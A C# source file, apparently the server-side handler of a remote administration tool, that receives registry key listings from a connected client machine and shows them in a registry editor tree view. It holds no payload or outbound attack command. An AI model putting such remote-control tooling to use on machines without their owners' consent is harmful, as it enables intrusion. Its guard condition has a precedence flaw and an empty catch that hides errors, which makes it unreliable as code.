using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using xServer.Core.Networking;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
    public static partial class CommandHandler
    {
        public static void HandleLoadRegistryKey(xServer.Core.Packets.ClientPackets.GetRegistryKeysResponse packet, Client client)
        {
            try
            {
                // Make sure that we can use the packet.
                if (packet.Matches != null && packet.Matches.Length > 0)
                {
                    // Make sure that the client is in the correct state to handle the packet appropriately.
                    if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
                    {
                        if (packet.IsRootKey)
                        {
                            foreach (Utilities.RegSeekerMatch match in packet.Matches)
                            {
                                client.Value.FrmRe.AddRootKey(match);
                            }
                        }
                        else
                        {
                            // Add the key to the TreeView.
                            foreach (Utilities.RegSeekerMatch match in packet.Matches)
                            {
                                client.Value.FrmRe.AddKeyToTree(match);
                            }
                        }
                    }
                }
            }
            catch
            { }
        }
    }
}